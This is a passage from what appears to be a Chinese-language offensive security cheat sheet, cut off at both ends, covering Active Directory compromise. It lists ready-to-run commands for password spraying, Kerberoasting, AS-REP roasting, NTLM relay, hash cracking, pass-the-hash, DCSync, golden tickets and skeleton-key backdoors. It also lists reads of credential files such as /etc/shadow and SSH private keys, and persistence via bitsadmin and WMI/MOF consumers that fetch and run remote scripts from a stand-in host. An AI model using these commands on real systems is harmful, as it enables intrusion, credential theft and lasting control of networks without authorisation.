<IP> -u 'user' -p 'password' --pass-pol enum4linx -u 'username' -p 'password' -P <IP> cme smb <dc-ip> -u user.txt -p password.txt --no-bruteforce # \u4e0d\u7206\u7834\uff0c\u53ea\u6d4b\u8bd5\u5355\u4e00\u7684 user=password cme smb <dc-ip> -u user.txt -p password.txt # \u4ea4\u53c9\u7206\u7834\uff0c\u6839\u636e\u5bc6\u7801\u7b56\u7565\uff0c\u5931\u8d25\u8fc7\u591a\u53ef\u80fd\u4f1a\u88ab\u5c01\u7981 ASREP-Roasting\u653b\u51fb \u00b6 \u83b7\u53d6hash \u00b6 python GetNPUsers.py <domain>/ -usersfile <usernames.txt> -format hashcat -outputfile <hashes.domain.txt> Rubeus asreproast /format:hashcat \u83b7\u53d6ASREP-Roastable\u8d26\u53f7 \u00b6 Get-DomainUser -PreauthNotRequired -Properties SamAccountName MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p \u62ff\u5230\u4efb\u610f\u4e00\u4e2a\u57df\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801 \u00b6 \u83b7\u53d6\u5176\u4ed6\u8d26\u6237\u5bc6\u7801 \u00b6 1.\u83b7\u53d6\u57df\u5185\u6240\u6709\u8d26\u6237\u540d \u00b6 GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username> 2.\u679a\u4e3e SMB \u5171\u4eab \u00b6 cme smb <ip> -u <user> -p <password> --shares 3.bloodhound \u00b6 bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all 4.powerview / pywerview \u00b6 Kerberoasting\u653b\u51fb \u00b6 \u83b7\u53d6hash \u00b6 GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password> Rubeus kerberoast \u67e5\u627e kerberoastable \u8d26\u53f7 \u00b6 Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName MATCH (u:User {hasspn:true}) RETURN u MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p MS14-068 \u00b6 FindSMB2UPTime.py rpcclient $> lookupnames <name> wmic useraccount get name,sid auxiliary/admin/kerberos/ms14_068_kerberos_checksum goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target> kerberos::ptc \"<ticket>\" PrintNightmare \u00b6 CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\\\<smb_server_ip>\\<share>\\inject.dll' \u679a\u4e3e DNS \u670d\u52a1\u5668 \u00b6 dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action query <dc_ip> 7.relay/poisoning\u653b\u51fb \u00b6 \u626b\u63cf\u6ca1\u5f00\u542fSMB\u7b7e\u540d\u7684\u673a\u5668 \u00b6 nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK use exploit/windows/smb/smb_relay cme smb $hosts --gen-relay-list relay.txt PetitPotam \u00b6 PetitPotam.py -d <domain> <listener_ip> <target_ip> \u540e\u7eed\u53ef\u4ee5\u8ddf\u7740adcs\u653b\u51fb \u76d1\u542c \u00b6 responder -i eth0 mitm6 -d <domain> \u65e0SMB\u7b7e\u540d || \u5f00\u542fIPv6 || ADCS \u00b6 1.MS08-068 \u00b6 use exploit/windows/smb/smb_relay #\u5e38\u7528\u4e8ewindows2003 / windows server2008 responder -I eth0 # \u8bb0\u5f97\u5148\u5173\u95ed\u672c\u673a\u7684 smb \u548c http \u670d\u52a1 ntlmrelayx.py -tf targets.txt 2.mitm6 -i eth0 -d \u00b6 ntlmrelayx.py -6 -wh <attacker_ip> -l /tmp -socks -debug ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access getST.py -spn cifs/<target> <domain>/<netbios_name>\\$ -impersonate <user> 3.adcs \u00b6 ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt 8.\u62ff\u5230hash\u7834\u89e3 \u00b6 1.LM \u00b6 john --format=lm hash.txt hashcat -m 3000 -a 3 hash.txt 2.NTLM \u00b6 john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt 3.NTLMv1 \u00b6 john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt 4.NTLMv2 \u00b6 john --format=netntlmv2 hash.txt hashcat -m 5600 -a 0 hash.txt rockyou.txt 5.Kerberos 5 TGS \u00b6 john spn.txt --format=krb5tgs --wordlist=rockyou.txt hashcat -m 13100 -a 0 spn.txt rockyou.txt 6.Kerberos ASREP \u00b6 hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt 9.\u6a2a\u5411\u79fb\u52a8 \u00b6 1.PTH \u00b6 psexec.py -hashes \":<hash>\" <user>@<ip> wmiexec.py -hashes \":<hash>\" <user>@<ip> atexec.py -hashes \":<hash>\" <user>@<ip> \"command\" evil-winrm -i <ip>/<domain> -u <user> -H <hash> xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip> 2.PTK \u00b6 python getTGT.py <domain>/<user> -hashes :<hashes> export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache python psexec.py <domain>/<user>@<ip> -k -no-pass Rubeus asktgt /user:victim /rc4:<rc4value> Rubeus ptt /ticket:<ticket> Rubeus createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe] Rubeus ptt /luid:0xdeadbeef /ticket:<ticket> 3.\u975e\u7ea6\u675f\u59d4\u6d3e \u00b6 \u83b7\u53d6\u7968\u636e \u00b6 privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export Rubeus dump /service:krbtgt /nowrap Rubeus dump /luid:0xdeadbeef /nowrap \u67e5\u627e\u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a \u00b6 Get-NetComputer -Unconstrained Get-DomainComputer -Unconstrained -Properties DnsHostName MATCH (c:Computer {unconstraineddelegation:true}) RETURN c MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p 4.\u7ea6\u675f\u59d4\u6d3e \u00b6 \u83b7\u53d6\u7968\u636e \u00b6 privilege::debug sekurlsa::tickets /export sekurlsa::tickets / Rubeus dump /service:krbtgt /nowrap Rubeus dump /luid:0xdeadbeef /nowrap \u67e5\u627e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a \u00b6 Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p MATCH (u:User {owned:true}), (c:Computer {name: \"<MYTARGET.FQDN>\"}), p=shortestPath((u)-[*1..]->(c)) RETURN p 5.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e \u00b6 6.dcsync \u00b6 lsadump::dcsync /domain:htb.local /user:krbtgt # Administrators, Domain Admins, Enterprise Admins \u7ec4\u4e0b\u7684\u8d26\u6237\u90fd\u884c 7.\u6253\u5370\u673a SpoolService \u6f0f\u6d1e\u5229\u7528 \u00b6 rpcdump.py <domain>/<user>:<password>@<domain_server> | grep MS-RPRN printerbug.py '<domain>/<username>:<password>'@<Printer IP> <RESPONDERIP> 8.AD\u57dfACL\u653b\u51fb(aclpwn.py) \u00b6 GenericAll on User GenericAll on Group GenericAll / GenericWrite / Write on Computer WriteProperty on Group Self (Self-Membership) on Group WriteProperty (Self-Membership) ForceChangePassword WriteOwner on Group GenericWrite on User WriteDACL + WriteOwner 9.\u83b7\u53d6LAPS\u7ba1\u7406\u5458\u5bc6\u7801 \u00b6 Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}} 10.privexchange\u6f0f\u6d1e \u00b6 python privexchange.py -ah <attacker_host_or_ip> <exchange_host> -u <user> -d <domain> -p <password> ntlmrelayx.py -t ldap://<dc_fqdn>--escalate-user <user> Exchange\u7684\u5229\u7528 \u00b6 Exchange2domain CVE-2018-8581 CVE-2019-1040 CVE-2020-0688 NtlmRelayToEWS ewsManage CVE-2021-26855 CVE-2021-28482 11.IPC \u00b6 net use \\\\ip\\ipc$ \"password\" /user:\"administrator\" net use \\\\ip\\c$ \"password\" /user:\"administrator\" 12.\u5176\u4ed6\u6a2a\u79fb \u00b6 1.\u5411WSUS\u670d\u52a1\u5668\u6570\u636e\u5e93\u6ce8\u5165\u6076\u610f\u7a0b\u5e8f\u66f4\u65b0 WSUSpendu.ps1 # \u9700\u8981\u5148\u62ff\u4e0b WSUS \u66f4\u65b0\u5206\u53d1\u670d\u52a1\u5668 2.MSSQL Trusted Links use exploit/windows/mssql/mssql_linkcrawler 3.GPO Delegation 4.ADCS 10.\u6743\u9650\u7ef4\u6301 \u00b6 \u62ff\u5230\u57df\u63a7\u6743\u9650 \u00b6 dump ntds.dit \u6587\u4ef6 crackmapexec smb 127.0.0.1 -u <user> -p <password> -d <domain> --ntds secretsdump.py '<domain>/<user>:<pass>'@<ip> ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract windows/gather/credentials/domain_hashdump \u540e\u95e8 \u00b6 net group \"domain admins\" myuser /add /domain Golden ticket\uff08\u9ec4\u91d1\u7968\u636e\uff09 Silver Ticket\uff08\u767d\u94f6\u7968\u636e\uff09 DSRM \u540e\u95e8\uff1a PowerShell New-ItemProperty \u201cHKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\u201d -Name \u201cDsrmAdminLogonBehavior\u201d -Value 2 -PropertyType DWORD Skeleton Key\uff1a mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" \u81ea\u5b9a\u4e49 SSP DLL\uff1a mimikatz \"privilege::debug\" \"misc::memssp\" \"exit\" C:\\Windows\\System32\\kiwissp.log \u57df\u4fe1\u4efb\u5173\u7cfb \u00b6 \u5b50\u57df\u653b\u51fb\u7236\u57df - SID History\u7248\u8de8\u57df\u9ec4\u91d1\u7968\u636e \u00b6 Get-NetGroup -Domain <domain> -GroupName \"Enterprise Admins\" -FullData|select objectsid mimikatz lsadump::trust kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt \u5229\u7528\u57df\u4fe1\u4efb\u5bc6\u94a5\u83b7\u53d6\u76ee\u6807\u57df\u7684\u6743\u9650 - \u4fe1\u4efb\u7968\u636e \u00b6 \"lsadump::trust /patch\" \"lsadump::lsa /patch\" \"kerberos::golden /user:Administrator /domain:<domain> /sid: <domain_SID> /rc4:<trust_key> /service:krbtgt /target:<target_domain> /ticket: <golden_ticket_path>\" \u653b\u51fb\u5176\u5b83\u6797 \u00b6 \u5229\u7528ptintbug\u6216petipotam\u6f0f\u6d1e\u4f7f\u5176\u5b83\u6797\u7684DC\u4e3b\u52a8\u8fde\u63a5\u5230\u672c\u6797\u7684\u4e00\u53f0\u65e0\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a\uff0c\u540c\u65f6\u6293\u53d6\u53d1\u9001\u8fc7\u6765\u7684TGT\uff0c\u7136\u540e\u5373\u53ef\u5c06\u5b83\u7528\u4e8edcsync\u653b\u51fb \u6d3b\u52a8\u76ee\u5f55\u6301\u4e45\u6027\u6280\u5de7 \u00b6 https://adsecurity.org/?p=1929 DS\u6062\u590d\u6a21\u5f0f\u5bc6\u7801\u7ef4\u62a4 DSRM\u5bc6\u7801\u540c\u6b65 Windows Server 2008 \u9700\u8981\u5b89\u88c5KB961320\u8865\u4e01\u624d\u652f\u6301DSRM\u5bc6\u7801\u540c\u6b65\uff0cWindows Server 2003\u4e0d\u652f\u6301DSRM\u5bc6\u7801\u540c\u6b65\u3002KB961320: https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,\u53ef\u53c2\u8003 \uff1a \u5de7\u7528DSRM\u5bc6\u7801\u540c\u6b65\u5c06\u57df\u63a7\u6743\u9650\u6301\u4e45\u5316 DCshadow Security Support Provider \u00b6 \u7b80\u5355\u7684\u7406\u89e3\u4e3aSSP\u5c31\u662f\u4e00\u4e2aDLL\uff0c\u7528\u6765\u5b9e\u73b0\u8eab\u4efd\u8ba4\u8bc1 privilege::debug misc::memssp \u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u91cd\u542f c:/windows/system32 \u53ef\u770b\u5230\u65b0\u751f\u6210\u7684\u6587\u4ef6kiwissp.log SID History \u00b6 SID\u5386\u53f2\u8bb0\u5f55\u5141\u8bb8\u53e6\u4e00\u4e2a\u5e10\u6237\u7684\u8bbf\u95ee\u88ab\u6709\u6548\u5730\u514b\u9686\u5230\u53e6\u4e00\u4e2a\u5e10\u6237 mimikatz \"privilege::debug\" \"misc::addsid bobafett ADSAdministrator\" AdminSDHolder\uff06SDProp \u00b6 \u5229\u7528AdminSDHolder\uff06SDProp\uff08\u91cd\u65b0\uff09\u83b7\u53d6\u57df\u7ba1\u7406\u6743\u9650 Dcsync\u540e\u95e8 \u00b6 \u5411\u57df\u6210\u5458\u8d4b\u4e88Dcsync\u6743\u9650 Powerview.ps1 Add-DomainObjectAcl -TargetIdentity \"DC=vulntarget,DC=com\" -PrincipalIdentity test1 -Rights DCSync -Verbose \u5728\u767b\u5f55\u4e86test1\u57df\u8d26\u6237\u7684\u673a\u5668\u4e0a\u6267\u884cDcsync\u5229\u7528\u64cd\u4f5c mimikatz \"lsadump::dcsync /domain:vulntarget.com /all /csv\" \u7ec4\u7b56\u7565 \u00b6 https://adsecurity.org/?p=2716 \u7b56\u7565\u5bf9\u8c61\u5728\u6301\u4e45\u5316\u53ca\u6a2a\u5411\u6e17\u900f\u4e2d\u7684\u5e94\u7528 Hook PasswordChangeNotify \u00b6 http://www.vuln.cn/6812 Kerberoasting\u540e\u95e8 \u00b6 \u57df\u6e17\u900f-Kerberoasting AdminSDHolder \u00b6 Backdooring AdminSDHolder for Persistence Delegation \u00b6 Unconstrained Domain Persistence \u8bc1\u4e66\u4f2a\u9020\uff1a pyForgeCert 11.\u654f\u611f\u6587\u4ef6 \u00b6 windows \u00b6 \u654f\u611f\u914d\u7f6e\u6587\u4ef6 C:\\boot.ini //\u67e5\u770b\u7cfb\u7edf\u7248\u672c C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS\u914d\u7f6e\u6587\u4ef6 C:\\Windows\\repair\\sam //\u5b58\u50a8\u7cfb\u7edf\u521d\u6b21\u5b89\u88c5\u7684\u5bc6\u7801 C:\\Program Files\\mysql\\my.ini //Mysql\u914d\u7f6e C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php\u914d\u7f6e\u4fe1\u606f C:\\Windows\\my.ini //Mysql\u914d\u7f6e\u4fe1\u606f C:\\Windows\\win.ini //Windows\u7cfb\u7edf\u7684\u4e00\u4e2a\u57fa\u672c\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6 Linux \u00b6 \u654f\u611f\u914d\u7f6e\u6587\u4ef6 #\u5224\u65ad\u662f\u5426\u5728docker\u5bb9\u5668\u5185 /proc/1/cgroup # \u7cfb\u7edf\u7248\u672c cat /etc/issue # \u5185\u6838\u7248\u672c cat /proc/version # \u8d26\u6237\u5bc6\u7801 cat /etc/passwd cat /etc/shadow # \u73af\u5883\u53d8\u91cf cat /etc/profile # \u7cfb\u7edf\u5e94\u7528(\u547d\u4ee4) ls -lah/sbin # \u5b89\u88c5\u5e94\u7528(\u547d\u4ee4) la -lah /usr/bin # \u5f00\u673a\u81ea\u542f cat /etc/crontab # history cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history # \u7f51\u7edc\u914d\u7f6e cat /etc/resolv.conf cat /etc/networks cat /etc/network/interfaces cat /etc/sysconfig/network cat /etc/host.conf cat /etc/hosts cat /etc/dhcpd.conf # Service\u914d\u7f6e cat /etc/apache2/apache2.conf cat /etc/httpd/conf/httpd.conf cat /etc/httpd/conf/httpd2.conf cat /var/apache2/config.inc cat /usr/local/etc/nginx/nginx.conf cat /usr/local/nginx/conf/nginx.conf cat /etc/my.cnf cat /etc/mysql/my.cnf cat /var/lib/mysql/mysql/user.MYD cat /etc/mongod.conf cat /usr/local/redis/redis.conf cat /etc/redis/redis.conf # ftp cat /etc/proftpd.conf # mail cat /var/mail/root cat /var/spool/mail/root cat ~/.fetchmailrc cat /etc/procmailrc cat ~/.procmailrc cat /etc/exim/exim.cf cat /etc/postfix/main.cf cat /etc/mail/sendmail.mc cat /usr/share/sendmail/cf/cf/linux.smtp.mc cat /etc/mail/sendmail.cf # ssh cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key # log ls /var/log cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log # proc fuzz /proc/self/fd/32 /proc/self/fd/33 /proc/self/fd/34 /proc/self/fd/35 /proc/sched_debug /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/net/fib_trie /proc/version 12.\u6743\u9650\u63d0\u5347 \u00b6 Windows \u00b6 bypass UAC \u00b6 \u5e38\u7528\u65b9\u6cd5 \u00b6 \u4f7f\u7528IFileOperation COM\u63a5\u53e3 \u4f7f\u7528Wusa.exe\u7684extract\u9009\u9879 \u8fdc\u7a0b\u6ce8\u5165SHELLCODE \u5230\u5080\u5121\u8fdb\u7a0b DLL\u52ab\u6301\uff0c\u52ab\u6301\u7cfb\u7edf\u7684DLL\u6587\u4ef6 eventvwr.exe and registry hijacking sdclt.exe SilentCleanup wscript.exe cmstp.exe \u4fee\u6539\u73af\u5883\u53d8\u91cf\uff0c\u52ab\u6301\u9ad8\u6743\u9650.Net\u7a0b\u5e8f \u4fee\u6539\u6ce8\u518c\u8868HKCU\\Software\\Classes\\CLSID\uff0c\u52ab\u6301\u9ad8\u6743\u9650\u7a0b\u5e8f \u76f4\u63a5\u63d0\u6743\u8fc7UAC \u2026\u2026 \u5e38\u7528\u5de5\u5177 \u00b6 UACME Bypass-UAC Yamabiko \u2026 \u63d0\u6743 \u00b6 windows\u5185\u6838\u6f0f\u6d1e\u63d0\u6743 \u68c0\u6d4b\u7c7b: Windows-Exploit-Suggester , WinSystemHelper , wesng \u5229\u7528\u7c7b: windows-kernel-exploits \uff0c BeRoot \u670d\u52a1\u63d0\u6743 \u6570\u636e\u5e93\u670d\u52a1\uff0cftp\u670d\u52a1\u7b49 WINDOWS\u9519\u8bef\u7cfb\u7edf\u914d\u7f6e \u7cfb\u7edf\u670d\u52a1\u7684\u9519\u8bef\u6743\u9650\u914d\u7f6e\u6f0f\u6d1e \u4e0d\u5b89\u5168\u7684\u6ce8\u518c\u8868\u6743\u9650\u914d\u7f6e \u4e0d\u5b89\u5168\u7684\u6587\u4ef6/\u6587\u4ef6\u5939\u6743\u9650\u914d\u7f6e \u8ba1\u5212\u4efb\u52a1 \u4efb\u610f\u7528\u6237\u4ee5NT AUTHORITY\\SYSTEM\u6743\u9650\u5b89\u88c5msi \u63d0\u6743\u811a\u672c PowerUP , ElevateKit Linux \u00b6 \u5185\u6838\u6ea2\u51fa\u63d0\u6743 \u00b6 linux-kernel-exploits \u8ba1\u5212\u4efb\u52a1 \u00b6 crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root SUID \u00b6 find / -user root -perm -4000 -print 2>/dev/null find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; \u5bfb\u627e\u53ef\u5229\u7528bin\uff1a https://gtfobins.github.io/ \u73af\u5883\u53d8\u91cf \u00b6 cd /tmp echo \u201c/bin/sh\u201d > ps chmod 777 ps echo $PATH export PATH=/tmp:$PATH cd /home/raj/script ./shell whoami Linux\u73af\u5883\u53d8\u91cf\u63d0\u6743 - \u5148\u77e5\u793e\u533a) \u7cfb\u7edf\u670d\u52a1\u7684\u9519\u8bef\u6743\u9650\u914d\u7f6e\u6f0f\u6d1e \u00b6 cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg \u4e0d\u5b89\u5168\u7684\u6587\u4ef6/\u6587\u4ef6\u5939\u6743\u9650\u914d\u7f6e \u00b6 cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history \u627e\u5b58\u50a8\u7684\u660e\u6587\u7528\u6237\u540d\uff0c\u5bc6\u7801 \u00b6 grep -i user [filename] grep -i pass [filename] grep -C 5 \"password\" [filename] find . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\" # Joomla 13.\u6743\u9650\u7ef4\u6301 \u00b6 Windows \u00b6 1\u3001\u5bc6\u7801\u8bb0\u5f55\u5de5\u5177 \u00b6 WinlogonHack WinlogonHack \u662f\u4e00\u6b3e\u7528\u6765\u52ab\u53d6\u8fdc\u7a0b3389\u767b\u5f55\u5bc6\u7801\u7684\u5de5\u5177\uff0c\u5728 WinlogonHack \u4e4b\u524d\u6709 \u4e00\u4e2a Gina \u6728\u9a6c\u4e3b\u8981\u7528\u6765\u622a\u53d6 Windows 2000\u4e0b\u7684\u5bc6\u7801\uff0cWinlogonHack \u4e3b\u8981\u7528\u4e8e\u622a \u53d6 Windows XP \u4ee5\u53ca Windows 2003 Server\u3002 \u952e\u76d8\u8bb0\u5f55\u5668 \u5b89\u88c5\u952e\u76d8\u8bb0\u5f55\u7684\u76ee\u5730\u4e0d\u5149\u662f\u8bb0\u5f55\u672c\u673a\u5bc6\u7801\uff0c\u662f\u8bb0\u5f55\u7ba1\u7406\u5458\u4e00\u5207\u7684\u5bc6\u7801\uff0c\u6bd4\u5982\u8bf4\u4fe1\u7bb1\uff0cWEB \u7f51\u9875\u5bc6\u7801\u7b49\u7b49\uff0c\u8fd9\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u7ba1\u7406\u5458\u7684\u5f88\u591a\u4fe1\u606f\u3002 NTPass \u83b7\u53d6\u7ba1\u7406\u5458\u53e3\u4ee4,\u4e00\u822c\u7528 gina \u65b9\u5f0f\u6765,\u4f46\u6709\u4e9b\u673a\u5668\u4e0a\u5b89\u88c5\u4e86 pcanywhere \u7b49\u8f6f\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u8fdc\u7a0b\u767b\u5f55\u7684\u65f6\u5019\u51fa\u73b0\u6545\u969c\uff0c\u672c\u8f6f\u4ef6\u53ef\u5b9e\u73b0\u65e0\u969c\u788d\u622a\u53d6\u53e3\u4ee4\u3002 Linux \u4e0b openssh \u540e\u95e8 \u91cd\u65b0\u7f16\u8bd1\u8fd0\u884c\u7684sshd\u670d\u52a1\uff0c\u7528\u4e8e\u8bb0\u5f55\u7528\u6237\u7684\u767b\u9646\u5bc6\u7801\u3002 2\u3001\u5e38\u7528\u7684\u5b58\u50a8Payload\u4f4d\u7f6e \u00b6 WMI : \u5b58\u50a8\uff1a $StaticClass = New-Object Management.ManagementClass('root\\cimv2', $null,$null) $StaticClass.Name = 'Win32_Command' $StaticClass.Put() $StaticClass.Properties.Add('Command' , $Payload) $StaticClass.Put() \u8bfb\u53d6: $Payload=([WmiClass] 'Win32_Command').Properties['Command'].Value \u5305\u542b\u6570\u5b57\u7b7e\u540d\u7684PE\u6587\u4ef6 \u5229\u7528\u6587\u4ef6hash\u7684\u7b97\u6cd5\u7f3a\u9677\uff0c\u5411PE\u6587\u4ef6\u4e2d\u9690\u85cfPayload\uff0c\u540c\u65f6\u4e0d\u5f71\u54cd\u8be5PE\u6587\u4ef6\u7684\u6570\u5b57\u7b7e\u540d \u7279\u6b8aADS \u2026 type putty.exe > ...:putty.exe wmic process call create c:\\test\\ads\\...:putty.exe \u7279\u6b8aCOM\u6587\u4ef6 type putty.exe > \\\\.\\C:\\test\\ads\\COM1:putty.exe wmic process call create \\\\.\\C:\\test\\ads\\COM1:putty.exe \u78c1\u76d8\u6839\u76ee\u5f55 type putty.exe >C:\\:putty.exe wmic process call create C:\\:putty.exe 3\u3001Run/RunOnce Keys \u00b6 \u7528\u6237\u7ea7 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce \u7ba1\u7406\u5458 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run 4\u3001BootExecute Key \u00b6 \u7531\u4e8esmss.exe\u5728Windows\u5b50\u7cfb\u7edf\u52a0\u8f7d\u4e4b\u524d\u542f\u52a8\uff0c\u56e0\u6b64\u4f1a\u8c03\u7528\u914d\u7f6e\u5b50\u7cfb\u7edf\u6765\u52a0\u8f7d\u5f53\u524d\u7684\u914d\u7f6e\u5355\u5143\uff0c\u5177\u4f53\u6ce8\u518c\u8868\u952e\u503c\u4e3a\uff1a HKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelist HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Session Manager 5\u3001Userinit Key \u00b6 WinLogon\u8fdb\u7a0b\u52a0\u8f7d\u7684login scripts,\u5177\u4f53\u952e\u503c\uff1a HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 6\u3001Startup Keys \u00b6 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders 7\u3001Services \u00b6 \u521b\u5efa\u670d\u52a1 sc create [ServerName] binPath= BinaryPathName 8\u3001Browser Helper Objects \u00b6 \u672c\u8d28\u4e0a\u662fInternet Explorer\u542f\u52a8\u65f6\u52a0\u8f7d\u7684DLL\u6a21\u5757 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects 9\u3001AppInit_DLLs \u00b6 \u52a0\u8f7dUser32.dll\u4f1a\u52a0\u8f7d\u7684DLL HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs 10\u3001\u6587\u4ef6\u5173\u8054 \u00b6 HKEY_LOCAL_MACHINE\\Software\\Classes HKEY_CLASSES_ROOT 11\u3001 bitsadmin \u00b6 bitsadmin /create backdoor bitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe \"/u /s /i:https://host.com/calc.sct scrobj.dll\" bitsadmin /Resume backdoor 12\u3001 mof \u00b6 pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP1\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 1\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consP1\"; ScriptingEngine = \"JScript\"; ScriptText = \"GetObject(\\\"script:https://host.com/test\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; \u7ba1\u7406\u5458\u6267\u884c\uff1a mofcomp test.mof 13\u3001 wmi \u00b6 \u6bcf\u969460\u79d2\u6267\u884c\u4e00\u6b21notepad.exe wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"BotFilter82\", 